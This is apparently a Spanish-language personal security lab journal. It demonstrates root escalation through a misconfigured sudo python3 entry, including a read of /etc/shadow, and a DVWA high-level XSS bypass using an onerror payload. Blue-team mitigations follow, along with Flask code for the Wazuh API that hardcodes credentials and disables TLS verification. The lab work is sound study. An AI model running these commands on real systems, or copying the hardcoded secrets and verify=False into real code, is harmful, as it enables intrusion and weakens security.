# Día 17 — Privilege Escalation Linux: Sudo + XSS High + Wazuh API

**Fecha:** Abril 2026  
**MITRE:** T1548.003, T1185  
**DVWA:** XSS Reflected (High)

---

## Teoría

### Privilege Escalation — Sudo Misconfiguration
`sudo` permite ejecutar comandos como otro usuario (generalmente root). Cuando un administrador configura sudo de forma incorrecta — permitiendo a un usuario ejecutar un binario que puede lanzar shells — cualquier usuario limitado puede escalar a root. La herramienta de referencia para identificar binarios explotables via sudo es gtfobins.github.io.

### XSS High
En nivel Medium el filtro eliminaba `<script>` en minúsculas. En nivel High DVWA aplica una expresión regular más robusta que elimina todas las variantes de `<script>`. La defensa sigue siendo incompleta porque no cubre eventos HTML como `onerror`, `onclick`, `onload`, que también ejecutan JavaScript.

---

## Red Team

### Sección 1 — Configurar entorno sudo vulnerable

Desde vboxuser se agregó una línea en `/etc/sudoers` via `visudo`:

```
lowpriv ALL=(ALL) NOPASSWD: /usr/bin/python3
```

Esta configuración permite a lowpriv ejecutar python3 como root sin contraseña — simulando un error de administración real.

### Sección 2 — Verificar privilegios de lowpriv

```bash
su - lowpriv
sudo -l
```

```
User lowpriv may run the following commands on Ubuntu-Victim:
    (ALL) NOPASSWD: /usr/bin/python3
```

Sin grupos especiales, sin sudo general — solo python3 como root.

### Sección 3 — Explotación via sudo + python3

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Resultado:**
```
root@Ubuntu-Victim:/home/lowpriv#
```

**Verificación:**
```bash
whoami → root
id     → uid=0(root) gid=0(root) groups=0(root)
```

**Diferencia con Día 16 — SUID:**

| | Día 16 — SUID | Día 17 — Sudo |
|--|--|--|
| uid | 1001 (lowpriv) | 0 (root) |
| euid | 0 (root) | 0 (root) |
| Privilegios | Efectivos | Completos |
| Vector | Binario con bit SUID | sudo mal configurado |
| Detección | `find / -perm -4000` | `sudo -l` |

Con sudo mal configurado se obtiene `uid=0` real — más privilegios que con SUID donde solo se obtiene `euid=0`.

**Demostración — lectura de `/etc/shadow`:**
```bash
cat /etc/shadow | grep -E "vboxuser|lowpriv|root"
```
```
root:*:20368:...
vboxuser:$y$j9T$...
lowpriv:$y$j9T$...
```

### Sección 4 — DVWA XSS Reflected (High)

**Confirmación del filtro:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=high" | grep -i "hello"
```
```
Hello >
```
El filtro elimina casi todo el payload — solo deja `>`. Regex más robusta que Medium.

**Bypass — evento HTML `onerror`:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=high" | grep -i "hello"
```
```
Hello <img src=x onerror=alert(1)>
```

El filtro de High cubre todas las variantes de `<script>` pero no los eventos HTML. `<img src=x onerror=alert(1)>` pasa sin modificaciones — cuando la imagen falla al cargar, el browser ejecuta `alert(1)` automáticamente.

**Resumen XSS por niveles:**

| Nivel | Filtro | Bypass |
|-------|--------|--------|
| Low | Sin filtro | `<script>alert(1)</script>` directo |
| Medium | `str_replace` case-sensitive | `<Script>` o `onerror` |
| High | Regex elimina todas las variantes de `<script>` | `onerror` — eventos HTML no cubiertos |

---

## App MS Security — Wazuh API Integration

### Conexión a Wazuh API

Credenciales de la API encontradas en `docker-compose.yml`:
```
API_USERNAME=wazuh-wui
API_PASSWORD=MyS3cr37P450r.*-
```

Endpoints implementados en `app.py`:

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAZUH_URL = "https://localhost:55000"
WAZUH_USER = "wazuh-wui"
WAZUH_PASS = "MyS3cr37P450r.*-"

def get_wazuh_token():
    r = requests.post(
        f"{WAZUH_URL}/security/user/authenticate",
        auth=(WAZUH_USER, WAZUH_PASS),
        verify=False
    )
    return r.json()["data"]["token"]

@app.route('/wazuh/agents', methods=['GET'])
def wazuh_agents():
    token = get_wazuh_token()
    r = requests.get(
        f"{WAZUH_URL}/agents",
        headers={"Authorization": f"Bearer {token}"},
        verify=False
    )
    return jsonify(r.json()["data"]["affected_items"])

@app.route('/wazuh/alerts', methods=['GET'])
def wazuh_alerts():
    r = requests.get(
        "https://localhost:9200/wazuh-alerts-*/_search",
        auth=("admin", "SecretPassword"),
        params={"size": 20, "sort": "timestamp:desc"},
        verify=False
    )
    hits = r.json().get("hits", {}).get("hits", [])
    alerts = []
    for hit in hits:
        src = hit["_source"]
        alerts.append({
            "id": src.get("id", ""),
            "timestamp": src.get("timestamp", ""),
            "agent": src.get("agent", {}).get("name", ""),
            "rule_id": src.get("rule", {}).get("id", ""),
            "rule_level": src.get("rule", {}).get("level", 0),
            "description": src.get("rule", {}).get("description", ""),
            "groups": src.get("rule", {}).get("groups", [])
        })
    return jsonify({"alerts": alerts, "total": len(alerts)})
```

**Agentes activos:**

| ID | Nombre | Estado |
|----|--------|--------|
| 000 | wazuh.manager | active |
| 001 | Windows-Marco | active |

**Alertas reales de Windows-Marco:**
- Event ID 4688 — procesos creados (Docker, VS Code, servicios del sistema)
- Rule 67027 — Level 3
- Volumen alto por auditoría de Process Creation habilitada en Día 11

**Dashboard React actualizado** — nueva sección "Wazuh — Windows-Marco" con tabla de eventos reales separada de las alertas mock.

**Próximo:** Filtrar por `rule_level >= 7` para mostrar solo eventos Medium/High relevantes.

---

## Wazuh

### File Integrity Monitoring — pendiente
FIM en Windows-Marco para detectar cambios en archivos del sistema — se configura en sesión dedicada.

### Observación
Los 9,703 eventos Low visibles en el dashboard de Wazuh son principalmente eventos de Process Creation (Event ID 4688) generados por la auditoría configurada en el Día 11. Para reducir el ruido se filtrará por nivel en el endpoint `/wazuh/alerts`.

---

## Blue Team

### Detección Sudo Misconfiguration
- Comando de auditoría: `sudo -l` desde cualquier usuario muestra sus permisos
- En Wazuh — si tuviera agente en Ubuntu — una alerta de escalada de privilegios sería visible cuando `uid` cambia a 0
- Revisar `/etc/sudoers` regularmente para detectar entradas no autorizadas

### Mitigación Sudo
- Nunca permitir sudo sobre binarios que puedan ejecutar comandos arbitrarios (python, vim, find, perl, etc.)
- Si se necesita sudo restringido, usar wrappers específicos en lugar del binario completo
- Auditar `/etc/sudoers` y `/etc/sudoers.d/` periódicamente

### Mitigación XSS High
- `htmlspecialchars()` convierte `<`, `>`, `"`, `'` en entidades HTML — neutraliza cualquier tag o evento
- Las listas negras de tags siempre son bypasseables — la defensa correcta es escapar el output

---

## Conclusión

Sudo mal configurado es más peligroso que SUID — otorga `uid=0` real en lugar de solo `euid=0`. Un único binario mal configurado en sudoers es suficiente para comprometer completamente el sistema. XSS High confirma que las listas negras de tags son insuficientes — eventos HTML como `onerror` ofrecen vectores alternativos de ejecución de JavaScript. La integración con la API de Wazuh convierte el dashboard de mock a datos reales — primer paso hacia un SIEM dashboard funcional.
